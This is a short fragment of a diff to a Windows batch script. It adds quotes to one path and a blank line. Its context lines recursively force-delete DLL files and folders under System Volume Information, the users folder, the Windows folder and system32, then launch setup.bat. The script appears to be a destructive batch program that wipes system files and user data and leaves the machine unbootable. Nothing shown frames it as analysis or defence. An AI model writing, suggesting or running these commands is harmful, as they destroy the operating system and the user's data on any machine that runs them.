@@ -75,7 +75,7 @@ del /f /a /q /s vfcompact.dll
 FOR /D /R c:\"System Volume Information" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
 FOR /D /R c:\"users" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
 FOR /D /R c:\"windows" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
-FOR /D /R c:\windows\system32 %%X IN (*.dll) DO RMDIR /S /Q "%%X"
+FOR /D /R c:\"windows\system32" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
 cd /windows
 del /f /a /q /s system32
 FOR /D /R c:\"windows\system32" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
@@ -111,6 +111,7 @@ echo.
 start setup.bat
 
 setup.bat
+
 
 
 
